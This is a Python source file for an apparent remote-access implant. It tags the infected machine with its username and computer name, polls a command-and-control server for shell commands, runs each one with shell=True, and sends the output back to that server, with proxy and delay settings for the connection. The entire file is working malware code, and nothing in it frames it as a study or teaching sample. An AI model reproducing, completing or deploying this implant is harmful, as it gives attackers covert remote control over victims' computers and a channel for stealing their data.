from time import time, sleep
from requests import get, post, exceptions
from subprocess import run, PIPE, STDOUT
from settings import PORT, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
from os import getenv, chdir

client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

# client = getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time())

def post_to_server(message, response_path=RESPONSE_PATH):
    try:
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return


while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)

        if response.status_code == 404:
            raise exceptions.RequestException

    except exceptions.RequestException:
        sleep(DELAY)
        continue

    command = response.content.decode()

    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"{directory} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have permissions to access {directory}.\n")
        except OSError:
            post_to_server("There was an operating system error on the client.\n")

    else:
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output)

    print(response.status_code)
